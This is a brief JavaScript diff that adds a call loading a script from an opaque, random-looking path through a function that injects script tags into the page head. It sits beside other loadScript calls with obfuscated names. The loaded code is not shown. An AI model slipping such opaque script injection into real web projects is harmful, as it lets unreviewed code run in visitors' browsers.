@@ -4,6 +4,7 @@ function getHint(hint) {
     script.src = hint;
     document.head.appendChild(script);
 }
+getHint('/1san9cha1la7k9/dbhhfcfcfabe.js');
 loadScript('O0O0O0O010O0O0O0O0');
 loadScript('../O0O0O0O010O0O0O0O0');
 loadScript('../../O0O0O0O010O0O0O0O0');
